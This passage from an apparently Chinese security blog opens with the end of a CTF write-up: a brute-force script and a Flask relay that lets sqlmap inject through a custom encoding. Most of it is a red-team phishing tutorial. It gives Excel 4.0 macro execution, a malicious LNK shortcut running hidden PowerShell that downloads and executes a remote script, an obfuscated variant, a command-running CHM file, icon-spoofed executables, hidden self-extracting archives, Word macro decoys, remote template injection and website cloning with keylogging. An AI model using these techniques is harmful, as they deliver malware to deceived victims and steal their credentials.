class="line">一句话木马名称：ma</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/945581305.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">一句话密码：yingzi；第三个马子执行的命令：echo &#96;whoami&#96;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/2893776143.png"><br>最终整合得到flag：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;dede_admin_starsnowniubi_ma_yingzi_echo &#96;whoami&#96;;&#125;                  </span><br></pre></td></tr></table></figure><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="base"><a href="#base" class="headerlink" title="base"></a>base</h2><blockquote><p>106.55.249.213:5001<br>BaseBaseBase<br>你遇见过渗透中传输值为加密的嘛？</p></blockquote><p>打开链接发现他还带有参数后面，再根据题目信息，于是我尝试了各种base，无果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;106.55.249.213:5001?user&#x3D;QgcAYAbgbw&#x2F;</span><br><span class="line"></span><br><span class="line">Sorry,you are not admin!you are Guest</span><br></pre></td></tr></table></figure><p>最后试了试robots.txt发现了个base.txt</p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/985128690.png"></p><p>接着将其保存下来，组合成一个字典得到admin=XAXwaAZAaQ</p><p>附上脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">res&#x3D;&quot;&#123;&quot;</span><br><span class="line">with open(&quot;base.txt&quot;, &#39;r&#39;) as f:</span><br><span class="line">    a &#x3D; f.readlines()</span><br><span class="line">    for i in a:</span><br><span class="line">        tmp  &#x3D; i.strip(&quot;\n&quot;)</span><br><span class="line">        url &#x3D; &#39;http:&#x2F;&#x2F;106.55.249.213:5001&#x2F;?user&#x3D;&#39;+tmp</span><br><span class="line">        # print(url)</span><br><span class="line">        r &#x3D; requests.get(url)</span><br><span class="line">        z &#x3D; r.text[32:]</span><br><span class="line">        if z!&#x3D;&#39;&#39;:</span><br><span class="line">            k &#x3D; f&#39;&quot;&#123;z&#125;&quot;:&quot;&#123;tmp&#125;&quot;,&#39;</span><br><span class="line">        res +&#x3D; k</span><br><span class="line">res&#x3D;res[:-1]</span><br><span class="line">res+&#x3D;&quot;&#125;&quot;</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/3344035626.png"></p><p>经大佬指点得知需要整个flask脚本实现中转注入</p><p>附上脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from flask import Flask,request</span><br><span class="line"></span><br><span class="line">app &#x3D; Flask(__name__)</span><br><span class="line">a &#x3D; &#123;&quot; &quot;: &quot;CA&quot;, &quot;!&quot;: &quot;HA&quot;, &quot;&quot;: &quot;HQ&quot;, &quot;#&quot;: &quot;Hg&quot;, &quot;$&quot;: &quot;Hw&quot;, &quot;%&quot;: &quot;IA&quot;, &quot;&amp;&quot;: &quot;IQ&quot;, &quot;&#39;&quot;: &quot;Ig&quot;, &quot;(&quot;: &quot;Iw&quot;, &quot;)&quot;: &quot;JA&quot;,</span><br><span class="line">     &quot;*&quot;: &quot;JQ&quot;, &quot;+&quot;: &quot;Jg&quot;, &quot;,&quot;: &quot;Jw&quot;, &quot;-&quot;: &quot;KA&quot;, &quot;.&quot;: &quot;KQ&quot;, &quot;&#x2F;&quot;: &quot;Kg&quot;, &quot;0&quot;: &quot;Kw&quot;, &quot;1&quot;: &quot;LA&quot;, &quot;2&quot;: &quot;LQ&quot;, &quot;3&quot;: &quot;Lg&quot;,</span><br><span class="line">     &quot;4&quot;: &quot;Lw&quot;, &quot;5&quot;: &quot;MA&quot;, &quot;6&quot;: &quot;MQ&quot;, &quot;7&quot;: &quot;Mg&quot;, &quot;8&quot;: &quot;Mw&quot;, &quot;9&quot;: &quot;NA&quot;, &quot;:&quot;: &quot;NQ&quot;, &quot;;&quot;: &quot;Ng&quot;, &quot;&lt;&quot;: &quot;Nw&quot;, &quot;&#x3D;&quot;: &quot;OA&quot;,</span><br><span class="line">     &quot;&gt;&quot;: &quot;OQ&quot;, &quot;?&quot;: &quot;Og&quot;, &quot;@&quot;: &quot;Ow&quot;, &quot;A&quot;: &quot;PA&quot;, &quot;B&quot;: &quot;PQ&quot;, &quot;C&quot;: &quot;Pg&quot;, &quot;D&quot;: &quot;Pw&quot;, &quot;E&quot;: &quot;QA&quot;, &quot;F&quot;: &quot;QQ&quot;, &quot;G&quot;: &quot;Qg&quot;,</span><br><span class="line">     &quot;H&quot;: &quot;Qw&quot;, &quot;I&quot;: &quot;RA&quot;, &quot;J&quot;: &quot;RQ&quot;, &quot;K&quot;: &quot;Rg&quot;, &quot;L&quot;: &quot;Rw&quot;, &quot;M&quot;: &quot;SA&quot;, &quot;N&quot;: &quot;SQ&quot;, &quot;O&quot;: &quot;Sg&quot;, &quot;P&quot;: &quot;Sw&quot;, &quot;Q&quot;: &quot;TA&quot;,</span><br><span class="line">     &quot;R&quot;: &quot;TQ&quot;, &quot;S&quot;: &quot;Tg&quot;, &quot;T&quot;: &quot;Tw&quot;, &quot;U&quot;: &quot;UA&quot;, &quot;V&quot;: &quot;UQ&quot;, &quot;W&quot;: &quot;Ug&quot;, &quot;X&quot;: &quot;Uw&quot;, &quot;Y&quot;: &quot;VA&quot;, &quot;Z&quot;: &quot;VQ&quot;, &quot;[&quot;: &quot;Vg&quot;,</span><br><span class="line">     &quot;\\&quot;: &quot;Vw&quot;, &quot;]&quot;: &quot;WA&quot;, &quot;^&quot;: &quot;WQ&quot;, &quot;_&quot;: &quot;Wg&quot;, &quot;&#96;&quot;: &quot;Ww&quot;, &quot;a&quot;: &quot;XA&quot;, &quot;b&quot;: &quot;XQ&quot;, &quot;c&quot;: &quot;Xg&quot;, &quot;d&quot;: &quot;Xw&quot;, &quot;e&quot;: &quot;YA&quot;,</span><br><span class="line">     &quot;f&quot;: &quot;YQ&quot;, &quot;g&quot;: &quot;Yg&quot;, &quot;h&quot;: &quot;Yw&quot;, &quot;i&quot;: &quot;ZA&quot;, &quot;j&quot;: &quot;ZQ&quot;, &quot;k&quot;: &quot;Zg&quot;, &quot;l&quot;: &quot;Zw&quot;, &quot;m&quot;: &quot;aA&quot;, &quot;n&quot;: &quot;aQ&quot;, &quot;o&quot;: &quot;ag&quot;,</span><br><span class="line">     &quot;p&quot;: &quot;aw&quot;, &quot;q&quot;: &quot;bA&quot;, &quot;r&quot;: &quot;bQ&quot;, &quot;s&quot;: &quot;bg&quot;, &quot;t&quot;: &quot;bw&quot;, &quot;u&quot;: &quot;cA&quot;, &quot;v&quot;: &quot;cQ&quot;, &quot;w&quot;: &quot;cg&quot;, &quot;x&quot;: &quot;cw&quot;, &quot;y&quot;: &quot;dA&quot;,</span><br><span class="line">     &quot;z&quot;: &quot;dQ&quot;, &quot;&#123;&quot;: &quot;dg&quot;, &quot;|&quot;: &quot;dw&quot;, &quot;&#125;&quot;: &quot;eA&quot;, &quot;~&quot;: &quot;eQ&quot;, &quot;&quot;: &quot;eg&quot;, &quot;聙&quot;: &quot;ew&quot;, &quot;聛&quot;: &quot;fA&quot;, &quot;聜&quot;: &quot;fQ&quot;, &quot;聝&quot;: &quot;fg&quot;,</span><br><span class="line">     &quot;聞&quot;: &quot;fw&quot;, &quot;聟&quot;: &quot;gA&quot;, &quot;聠&quot;: &quot;gQ&quot;, &quot;聡&quot;: &quot;gg&quot;, &quot;聢&quot;: &quot;gw&quot;, &quot;聣&quot;: &quot;hA&quot;, &quot;聤&quot;: &quot;hQ&quot;, &quot;聥&quot;: &quot;hg&quot;, &quot;聦&quot;: &quot;hw&quot;, &quot;聧&quot;: &quot;iA&quot;,</span><br><span class="line">     &quot;聨&quot;: &quot;iQ&quot;, &quot;聫&quot;: &quot;ig&quot;, &quot;聬&quot;: &quot;iw&quot;, &quot;聭&quot;: &quot;jA&quot;, &quot;聮&quot;: &quot;jQ&quot;, &quot;聯&quot;: &quot;jg&quot;, &quot;聰&quot;: &quot;jw&quot;, &quot;聲&quot;: &quot;kA&quot;, &quot;聳&quot;: &quot;kQ&quot;, &quot;聴&quot;: &quot;kg&quot;,</span><br><span class="line">     &quot;聵&quot;: &quot;kw&quot;, &quot;聶&quot;: &quot;lA&quot;, &quot;職&quot;: &quot;lQ&quot;, &quot;聸&quot;: &quot;lg&quot;, &quot;聹&quot;: &quot;lw&quot;, &quot;聺&quot;: &quot;mA&quot;, &quot;聻&quot;: &quot;mQ&quot;, &quot;聼&quot;: &quot;mg&quot;, &quot;聽&quot;: &quot;mw&quot;, &quot;隆&quot;: &quot;nA&quot;,</span><br><span class="line">     &quot;垄&quot;: &quot;nQ&quot;, &quot;拢&quot;: &quot;ng&quot;, &quot;陇&quot;: &quot;nw&quot;, &quot;楼&quot;: &quot;oA&quot;, &quot;娄&quot;: &quot;oQ&quot;, &quot;搂&quot;: &quot;og&quot;, &quot;篓&quot;: &quot;ow&quot;, &quot;漏&quot;: &quot;pA&quot;, &quot;陋&quot;: &quot;pQ&quot;, &quot;芦&quot;: &quot;pg&quot;,</span><br><span class="line">     &quot;卢&quot;: &quot;pw&quot;, &quot;颅&quot;: &quot;qA&quot;, &quot;庐&quot;: &quot;qQ&quot;, &quot;炉&quot;: &quot;qg&quot;, &quot;掳&quot;: &quot;qw&quot;, &quot;卤&quot;: &quot;rA&quot;, &quot;虏&quot;: &quot;rQ&quot;, &quot;鲁&quot;: &quot;rg&quot;, &quot;麓&quot;: &quot;rw&quot;, &quot;碌&quot;: &quot;sA&quot;,</span><br><span class="line">     &quot;露&quot;: &quot;sQ&quot;, &quot;路&quot;: &quot;sg&quot;, &quot;赂&quot;: &quot;sw&quot;, &quot;鹿&quot;: &quot;tA&quot;, &quot;潞&quot;: &quot;tQ&quot;, &quot;禄&quot;: &quot;tg&quot;, &quot;录&quot;: &quot;tw&quot;, &quot;陆&quot;: &quot;uA&quot;, &quot;戮&quot;: &quot;uQ&quot;, &quot;驴&quot;: &quot;ug&quot;,</span><br><span class="line">     &quot;脌&quot;: &quot;uw&quot;, &quot;脕&quot;: &quot;vA&quot;, &quot;脗&quot;: &quot;vQ&quot;, &quot;脙&quot;: &quot;vg&quot;, &quot;脛&quot;: &quot;vw&quot;, &quot;脜&quot;: &quot;wA&quot;, &quot;脝&quot;: &quot;wQ&quot;, &quot;脟&quot;: &quot;wg&quot;, &quot;脠&quot;: &quot;ww&quot;, &quot;脡&quot;: &quot;xA&quot;,</span><br><span class="line">     &quot;脢&quot;: &quot;xQ&quot;, &quot;脣&quot;: &quot;xg&quot;, &quot;脤&quot;: &quot;xw&quot;, &quot;脥&quot;: &quot;yA&quot;, &quot;脦&quot;: &quot;yQ&quot;, &quot;脧&quot;: &quot;yg&quot;, &quot;脨&quot;: &quot;yw&quot;, &quot;脩&quot;: &quot;zA&quot;, &quot;脪&quot;: &quot;zQ&quot;, &quot;脫&quot;: &quot;zg&quot;,</span><br><span class="line">     &quot;脭&quot;: &quot;zw&quot;, &quot;脮&quot;: &quot;0A&quot;, &quot;脰&quot;: &quot;0Q&quot;, &quot;脳&quot;: &quot;0g&quot;, &quot;脴&quot;: &quot;0w&quot;, &quot;脵&quot;: &quot;1A&quot;, &quot;脷&quot;: &quot;1Q&quot;, &quot;脹&quot;: &quot;1g&quot;, &quot;脺&quot;: &quot;1w&quot;, &quot;脻&quot;: &quot;2A&quot;,</span><br><span class="line">     &quot;脼&quot;: &quot;2Q&quot;, &quot;脽&quot;: &quot;2g&quot;, &quot;脿&quot;: &quot;2w&quot;, &quot;谩&quot;: &quot;3A&quot;, &quot;芒&quot;: &quot;3Q&quot;, &quot;茫&quot;: &quot;3g&quot;, &quot;盲&quot;: &quot;3w&quot;, &quot;氓&quot;: &quot;4A&quot;, &quot;忙&quot;: &quot;4Q&quot;, &quot;莽&quot;: &quot;4g&quot;,</span><br><span class="line">     &quot;猫&quot;: &quot;4w&quot;, &quot;茅&quot;: &quot;5A&quot;, &quot;锚&quot;: &quot;5Q&quot;, &quot;毛&quot;: &quot;5g&quot;, &quot;矛&quot;: &quot;5w&quot;, &quot;铆&quot;: &quot;6A&quot;, &quot;卯&quot;: &quot;6Q&quot;, &quot;茂&quot;: &quot;6g&quot;, &quot;冒&quot;: &quot;6w&quot;, &quot;帽&quot;: &quot;7A&quot;,</span><br><span class="line">     &quot;貌&quot;: &quot;7Q&quot;, &quot;贸&quot;: &quot;7g&quot;, &quot;么&quot;: &quot;7w&quot;, &quot;玫&quot;: &quot;8A&quot;, &quot;枚&quot;: &quot;8Q&quot;, &quot;梅&quot;: &quot;8g&quot;, &quot;酶&quot;: &quot;8w&quot;, &quot;霉&quot;: &quot;9A&quot;, &quot;煤&quot;: &quot;9Q&quot;, &quot;没&quot;: &quot;9g&quot;,</span><br><span class="line">     &quot;眉&quot;: &quot;9w&quot;&#125;</span><br><span class="line">def encode(s):</span><br><span class="line">    s&#x3D;str(s)</span><br><span class="line">    res &#x3D; &#39;&#39;</span><br><span class="line">    for i in s:</span><br><span class="line">        res +&#x3D; a[i]</span><br><span class="line">    return res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;&#39;)</span><br><span class="line">def hello_world():</span><br><span class="line">    id&#x3D;encode(request.args.get(&#39;id&#39;))</span><br><span class="line">    url&#x3D;&#39;http:&#x2F;&#x2F;106.55.249.213:5001&#x2F;?user&#x3D;XAXwaAZAaQ&amp;id&#x3D;&#39;+id</span><br><span class="line">    return requests.get(url&#x3D;url).text</span><br><span class="line"></span><br><span class="line">app.run(debug&#x3D;True,port&#x3D;3389)</span><br></pre></td></tr></table></figure><p>先本地跑下flask脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 harvey.py</span><br></pre></td></tr></table></figure><p>接着就是sqlmap查下表就能得到flag：flag{SXC is very funny!}</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http:&#x2F;&#x2F;127.0.0.1:3389?id&#x3D;1</span><br><span class="line">python sqlmap.py -u http:&#x2F;&#x2F;127.0.0.1:3389?id&#x3D;1 --dump p id</span><br></pre></td></tr></table></figure><p>PS：艹，我这kali2020的sqlmap是假的，跑了十几分钟结果没跑出了<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3592519063.png"></p><p><a href="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/SXCTFHarvey.mp4">https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/SXCTFHarvey.mp4</a></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SXCCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>红队技巧-网络钓鱼</title>
      <link href="2021/02/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E5%B7%A7-%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC/"/>
      <url>2021/02/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E5%B7%A7-%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>涵盖了现在大多数红队钓鱼的手法，一直以来钓鱼配合免杀，更能出奇制胜！</p><h2 id="1-excel宏执行任意命令"><a href="#1-excel宏执行任意命令" class="headerlink" title="1. excel宏执行任意命令"></a>1. excel宏执行任意命令</h2><p>新建一个exel表，然后打开，对准这个右键点击插入宏。</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/614473386.png"></p><p>然后在第一切换到宏，复制粘贴如下语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;EXEC(&quot;notepad&quot;)</span><br><span class="line">&#x3D;HALT()</span><br></pre></td></tr></table></figure><p>必须带=HALT()，不然虽然命令执行了，但会报错，容易露馅！<br>然后测试一下，选中语句，右键，点击执行：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/838700290.png"></p><p>就会弹出notepad：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1721636292.png"></p><p>通过msf生成msi文件，python开启http服务，然后替换命令为攻击载荷，右键隐藏宏，并把文件执行方式改为<br>Auto_open，直接复制粘贴，按一下enter就行了</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2435505759.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2732847508.png"></p><p>然后另存，2016版本记得点击否，然后得选择一个启用宏的文件，远方服务器监听：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3099217363.png"></p><p>就欧克了，当然这里肯定不止这个msi文件，都能执行命令了，该怎么利用，你懂的！</p><h2 id="2-Link钓鱼："><a href="#2-Link钓鱼：" class="headerlink" title="2 Link钓鱼："></a>2 Link钓鱼：</h2><p>随便选择一个应用或者文件，右键点击创建快捷方式，右键打开属性：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1838770605.png"></p><p>我们需要更改目标这里的目标，这里的目标路径改成我们的攻击载荷，下面的起始位置可以不更改，基本上没啥影响。<br>修改：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\cmd.exe &#x2F;c powershell -nop -w hidden -exec bypass - -c &quot;IEX((New-Object System.Net.WebClient).DownloadString(&#39;&#x2F;&#x2F;192.168.1.109&#x2F;1.ps1&#39;))</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3845327971.png"></p><p>选择更改图标，因为我这里改成了cmd，快捷方式对应的图标也会更改为cmd，需要更改一下图标，查找图标路径改成shell32.dll 这里存放这windows系统所以的图标，不建议去自己加，因为你要发送给受害者，不能保证受害者电脑上有此图标</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1263613379.png"></p><p>然后再改一下快捷方式名字，比如像我这样，必须得诱人一点！</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3755953818.png"></p><p>那么一个link 钓鱼就完成了，但是这个放出去杀软立马干死，好人做到底，再来个过静态的免杀语句混淆。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd.exe &#x2F;c &quot;FOR &#x2F;F &quot;delims&#x3D;s\ tokens&#x3D;4&quot; %a IN (&#39;set^|findstr PSM&#39;)DO %a IEX (New-ObjectNet.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;bit.ly&#x2F;L3g1t&#39;)&quot;</span><br></pre></td></tr></table></figure><h2 id="3-CHM文档钓鱼："><a href="#3-CHM文档钓鱼：" class="headerlink" title="3 CHM文档钓鱼："></a>3 CHM文档钓鱼：</h2><p>新建一个文件夹，新建一个index.html，文件内容为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Mousejack replay&lt;&#x2F;title&gt;&lt;head&gt;&lt;&#x2F;head&gt;&lt;body&gt;</span><br><span class="line">command exec</span><br><span class="line">&lt;OBJECT id&#x3D;x classid&#x3D;&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width&#x3D;1 height&#x3D;1&gt;</span><br><span class="line">&lt;PARAM name&#x3D;&quot;Command&quot; value&#x3D;&quot;ShortCut&quot;&gt;</span><br><span class="line"> &lt;PARAM name&#x3D;&quot;Button&quot; value&#x3D;&quot;Bitmap::shortcut&quot;&gt;</span><br><span class="line"> &lt;PARAM name&#x3D;&quot;Item1&quot; value&#x3D;&#39;,calc.exe&#39;&gt;</span><br><span class="line"> &lt;PARAM name&#x3D;&quot;Item2&quot; value&#x3D;&quot;273,1,1&quot;&gt;</span><br><span class="line">&lt;&#x2F;OBJECT&gt;</span><br><span class="line">&lt;SCRIPT&gt;</span><br><span class="line">x.Click();</span><br><span class="line">&lt;&#x2F;SCRIPT&gt;</span><br><span class="line">&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1282025123.png"></p><p>然后打开Easy CHM程序，新建，浏览，选择我们建立好的目录，然后确定：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3242885363.png"></p><p>然后点击编译，然后就会生成一个chm文档</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2384073694.png"></p><p>那么我们这里只需要打开这个文件，就会执行里面的命令</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2654194455.png"></p><p>从代码上来看，chm文件是可以执行js代码的，那么就可以配合jsbackdoor 来进行权限获取，这里推荐一个项目：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Ridter&#x2F;MyJSRat</span><br></pre></td></tr></table></figure><p>一个py版本的JSbackdoor</p><h2 id="4-文件钓鱼"><a href="#4-文件钓鱼" class="headerlink" title="4.文件钓鱼"></a>4.文件钓鱼</h2><p>钓鱼方式的开山鼻祖，很古老了，原理就是利用一般人是不会打开显示已知的文件扩展名，而windows正常情况下不会显示已知的文件扩展名，但是从事信息安全的人员一般都打开了的。<br>这里制作也挺简单的，只需要更换一个图标就行，这里先用cs随便生成一个exe</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/184609184.png"></p><p>然后我把显示已知的文件扩展名关掉<br>首先把exe文件拖到resource hacker里，成功后面显示文件名，然后点击增加一个资源</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2998470057.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/502940224.png"></p><p>然后选择ico图标</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1130113496.png"></p><p>然后点击保存即可</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/209030690.png"></p><p>那么就成了鸭！</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1861199677.png"></p><h2 id="5-自解压钓鱼"><a href="#5-自解压钓鱼" class="headerlink" title="5. 自解压钓鱼"></a>5. 自解压钓鱼</h2><p>我这里就用刚刚改好的木马了，创建自解压文件：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1649302444.png"></p><p>点击高级，自解压选项，常规，设置自解压路径</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4042454625.png"></p><p>点击设置，设置解压后运行文件的路径</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1514118443.png"></p><p>模式选择全部隐藏</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1464487603.png"></p><p>更新设置成覆盖所有文件，保证二次自解压不报错，不会引起怀疑</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2174829634.png"></p><p>然后修改文件名和图标进行伪装就欧克了</p><h2 id="6-word宏钓鱼"><a href="#6-word宏钓鱼" class="headerlink" title="6.word宏钓鱼"></a>6.word宏钓鱼</h2><p>新建一个word，打开，然后点击视图，宏，查看宏，选择当前文档，点击创建</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1840227932.png"></p><p>然后cs生成宏代码，复制粘贴进去</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2252918189.png"></p><p>然后另存为docm文档？你以为就这样？<br>NO，咱们玩骚一点，我在网上随便找了个模板复制粘贴进去，然后截图，另存为</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1085757848.png"></p><p>打开我们的神器，美图秀秀，打开我们刚截图的图片，点击背景虚拟化，调整虚拟化程度，最好是那种弱影弱现的感觉最nice，然后加上一些说明嗷</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2867927300.png"></p><p>然后设置图片尺寸为790，1120</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1489980378.png"></p><p>然后保存，然后就可以看到效果了</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2287836159.png"></p><p>为什么会设置成790x1120嘞，只是为了刚好覆盖word里面的文本，然后docx文档另存为doc文档<br>然后打开，去开启显示开发者工具选项卡，文件-&gt;选项-&gt;自定义功能区-&gt;主选项卡-&gt;开发者工具</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2389974620.png"></p><p>然后点击开发者工具，选择图像（Active控件）</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1473113620.png"></p><p>设置图像格式为浮于文字上方，并把图像拉满</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/444250869.png"></p><p>效果就是这样，会把文字全部覆盖</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3233189288.png"></p><p>然后点击图像属性，设置成我们做好的图片，然后点击宏创建宏，cs生成宏木马</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3388623595.png"></p><p>复制粘贴，在Auto_Open（）函数首部编写代码，设置图片位置为0高度为0让宏运行后doc上图片消失，然后保存，office马就制作好了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Project.ThisDocument.Image1.Top &#x3D; 0</span><br><span class="line">Project.ThisDocument.Image1.Width &#x3D; 0</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2809499787.png"></p><p>成品展示：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/853217052.png"></p><p>那么点击启用宏，图片就好消失，显示出正常的文件来。<br>还有一种是远程加载的方式，先创建一个带有宏木马的文档另存为dotm后缀当成模板，放在远程服务器上，开启http服务，然后再新建一个模板word，改后缀改成zip，然后解压。</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3123339568.png"></p><p>然后找到这个文件settings.xml.rels，编辑</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3350739493.png"></p><p>替换成我们远程的宏木马文件的链接：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3412552913.png"></p><p>然后再把它压缩了，文件后缀又改回成docx，那么就成了，这种免杀效果要好一点，远程加载嘛。</p><h2 id="7-伪造网站钓鱼"><a href="#7-伪造网站钓鱼" class="headerlink" title="7.伪造网站钓鱼"></a>7.伪造网站钓鱼</h2><p>那么我们先来看cs中的clone web的模块</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4107586241.png"></p><p>填入克隆网站的url，可以选择进行键盘记录，然后点击就能克隆，但是有些网站也克隆不了，受到协议的保护，那么克隆好之后就可以点击进行管理</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3764393512.png"></p><p>那么就来讲讲cs中的邮件钓鱼板块</p><p><img 